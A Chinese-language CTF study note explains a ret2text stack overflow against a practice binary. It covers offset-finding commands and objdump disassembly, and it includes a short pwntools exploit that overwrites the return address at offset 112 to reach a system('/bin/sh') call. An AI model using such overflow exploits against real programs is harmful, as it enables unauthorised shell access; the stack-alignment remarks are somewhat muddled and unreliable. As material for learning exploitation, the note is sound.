一.快速确定偏移地址-复习上节

pwdbg:

cyclic 200

cyclic  -l 地址

peda:

pattern create 200

pattern offset 地址

不同插件有所差异吧：

查看汇编代码

objdump -t xxx 查看程序中使用到的函数

objdump -d xxx 查看程序中函数的汇编代码

objdump -d -j.plt xxx 查看plt表

    -j的参数有： .text  - 代码段

          .const- 只读数据段（有些编译器不使用此段，将只读数据并入.data段）

          .data - 读写数据段    

          .bss - bss段

objdump -d -M intel xxx 查看程序中函数的汇编代码，并且汇编代码是intel架构的

二.实例程序

不知道源码，命令：file ret2text      查看文件类型

 

可以看到是32位的intel架构可执行可执行文件

查看函数：objdump -t ret2text

查看汇编代码：objdump -d -M intel ret2text

 

先看到main函数吧，可以找到一个关键函数gets。

查找系统函数：objdump -d -M intel ret2text |grep system

 

可以看到它的地址：8048641

查看可以看到它属于一个secure函数内部：

 

但是此时我们还要看它的参数是啥：

其实就在上一行，地址0x8048763传入esp

查看该地址参数内容：先运行gdb，后输入：x/s 0x8048763

 

可见这个参数是很重要的，所以我们的定位点应该先在传入参数这一行，然后才是调用系统函数！

接下来再查看偏移，和上节讲的操作方法一样：

先生成字符串，后运行复制粘贴：

 

此时报出地址：

 

查看偏移：pattern offset 0x38414169

 

有个问题？为什么我的偏移少了1呢？

其实这里要注意一个细节就是，复制粘贴随机生成的字符串的时候不能是选到前后两端的单引号(  ‘  )

修复过后，偏移地址应该是112，上节笔记应该也加1！

此时我们再来写exp:

from pwn import *

p = process(“./ret2text”)

offset = 112

paload = offset*”A”+p32(0x804863a)#这是传入binsh传参的指令的地址

p.sendline(paload)

p.interactive()

ps: 其实这里应该注意一个栈对其问题，由于堆栈的一个压栈出栈的操作，所以导致ESP最后一位应该必定是0，4，8，在64位程序中，RSP最后一位就必定是0，8。在unbuntu18之后增加栈对其机制，如果在执行system函数的时候检测到ESP末位不是0那么就判断程序被劫持了然后停止执行。

下面这个一般就是栈对齐错误

 

所以这里的exp构造的payload的时候应该动态调试注意一下。

栈对齐错误总结：遇到要使用system函数payload就加上p64(ret)

运行exp：python2 expret2text.py
